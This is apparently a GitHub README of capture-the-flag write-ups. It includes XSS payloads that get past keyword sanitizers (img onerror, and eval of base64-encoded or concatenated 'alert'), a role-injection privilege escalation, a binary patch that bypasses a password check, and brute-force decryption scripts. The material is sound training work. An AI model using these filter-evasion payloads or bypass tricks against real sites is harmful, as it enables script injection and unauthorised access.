# CTF-CodeInTheDark
Interlogica CTF Code in the dark:
[https://ctf.codeinthedark.dev/challenges](https://ctf.codeinthedark.dev/challenges)

## 1 

Trigger an alert(1) in the small browser by evading the sanitizer's countermeasures. NOTE: the alert must be triggerable offline and without any further actions by the user.
The page has an input and renders the input after running a function on your code.
```
function sanitize(input) {
    // warmup
    return input;
}
```

Hints:  
Browser says `An iframe which has both allow-scripts and allow-same-origin for its sandbox attribute can escape its sandboxing.`.


Solution:
```
<iframe src="http%3A//hithere" 
        scrolling="no" sandbox="allow-scripts allow-popups allow-modals allow-same-origin" 
        name="sandbox" style="width: 100%; height: 100%; border: 0px;"></iframe>
<script>
   alert(1);
</script>
```

## 2

The page has an input and renders the input after running a function on your code.
```
function sanitize(input) {
    // no scripts!
    if (input.toLowerCase().includes('script')) {
        return 'NO!';
    }
    return input;
}
```

Solution:
```
<img src="" onerror=alert(1)>
```

Thanks M9k!

## 3
Just call the function from console.

## 4
Register. Password of moderator is in the user profile image. Get sources as moderator. Sources show that registratin take role too. Register as admin. As admin go to admin page and see flag.


## 5

The page has an input and renders the input after running a function on your code.
```
function sanitize(input) {
    // no alert!
    if (input.toLowerCase().includes('alert')) {
        return 'NO!';
    }
    return input;
}
```

Solution:
```
<iframe src="" 
        scrolling="no" sandbox="allow-scripts allow-popups allow-modals allow-same-origin" 
        name="sandbox" style="width: 100%; height: 100%; border: 0px;"></iframe>

<script>
console.log("hi");
eval(atob('YWxlcnQoMSk7'));
</script>
```

Where `YWxlcnQoMSk7` is `alert(1);`.  
  
Or you can use `eval("al"+"ert(1)")`, thanks pal!
## Forensics - Bad request-1
Open with Wireshark, tools -> credentials, click on the packet, look inside the http and Wireshark automatically will convert the auth bearer to plaintext:
![immagine](https://github.com/aliceblack/CTF-CodeInTheDark/assets/9288402/11a6c6a6-f99e-419e-a0f9-75564f469f5c)

## Reversing - PWNVOYAGE-LEVEL0 (40 coins)
Bruteforce with some intuition. The code was "TOOYOUNGTODIEBRO". The code is PRLG{HURT_M3_PL3NTY}

## Reversing - PWNVOYAGE-LEVEL1 (90 coins)
Follow the instruction for the file, analyzing the assembly the password is U_R_MY_H3RO, The code is NTRLGC{TH1SH1LLSM3LLSL1K3V1CT0RY}.

![immagine](https://github.com/aliceblack/CTF-CodeInTheDark/assets/9288402/1120c293-8dda-445c-805f-7d55cbb07012)

## Reversing - PWNVOYAGE-LEVEL2 (110 coins)
Follow the instruction for the file, patched the assembly, address 00101764 changed from JZ to JNZ. The code is NTRLGC{H3LL0B1TCH3S!}.
![immagine](https://github.com/aliceblack/CTF-CodeInTheDark/assets/9288402/5a1df428-719c-4477-ae89-de6dd7e7ec89)

![immagine](https://github.com/aliceblack/CTF-CodeInTheDark/assets/9288402/ea3d815a-7a46-44ca-a1b3-1e427517a326)



## Crypto - Intercepted message (90 coins)
Resolver in Powershell, each character is shifted based on his position, with an overflow when needed. The code is NTRLGC{CaesarSaladsForEveryone}.
```
function Convert-String {
    param (
        [string]$inputString
    )
    
    $outputString = ""

    for ($i = 0; $i -lt $inputString.Length; $i++) {
        $char = $inputString[$i]
        $asciiValue = [int][char]$char
        $newAsciiValue = $asciiValue - $i
        if ($newAsciiValue -lt 33) {
            $newAsciiValue += 95;
        }
        $newChar = [char]$newAsciiValue
        $outputString += $newChar
        Write-Host "--------------"
        Write-Host $char
        Write-Host $asciiValue
        Write-Host $newAsciiValue
        Write-Host $newChar
    }
    return $outputString
}

# Input string
$inputString = 'NUTOKH"Jin}l~`o{qu&Y$([.},4++#<'

# Call the function and store the result
$result = Convert-String -inputString $inputString

# Output the result
Write-Host "Original string: $inputString"
Write-Host "Transformed string: $result"
```


## Crypto - Space (90 coins)
Bruteforced, it take less than a second on my PC. The code is NTRLGC{m4y-7h3-47h-b3-w17h-y0u!}.
```
#!/usr/bin/env python3
import hashlib
import argparse

ct = "w2a\x7fq'I\tUOLV\\UOQR\\L\x07R\x1c\x12\x07\x04X\x14HRD\x12H"

def md5(msg:str)->str:
    return hashlib.md5(msg.encode()).hexdigest()

def xor(data:str,key:str):    
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(data, key))

def main():
    year = 2023
    month = 1
    day = 1
    while (True):
        key = f"{year:04}-{month:02}-{day:02}"
        hkey = md5(key)
        result = xor(ct, hkey)
        if (result.startswith('NTRLGC')):
            print(result)
        day += 1
        if (day > 31):
            day = 1
            month +=1
            if(month > 12):
                month = 1
                year -= 1

if __name__ == "__main__":
    main()
```

